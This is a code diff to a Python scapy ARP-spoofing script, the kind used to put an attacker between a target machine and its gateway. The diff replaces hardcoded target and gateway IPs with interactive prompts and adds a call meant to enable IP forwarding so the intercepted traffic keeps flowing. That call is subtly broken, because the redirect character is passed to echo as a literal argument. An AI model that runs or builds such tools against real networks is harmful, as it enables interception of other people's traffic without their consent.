@@ -3,6 +3,7 @@
 
 import scapy.all as scapy
 import time
+import subprocess
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -27,8 +28,9 @@ def restore(destination_ip, source_ip):
     # print(packet.summary())
     scapy.send(packet, count=4, verbose=False)
 
-target_ip = "192.168.30.135"
-gateway_ip = "192.168.30.2"
+target_ip = input("target ip: ")
+gateway_ip = input("gateway ip: ")
+subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
 
 try:
     sent_packets_count = 0
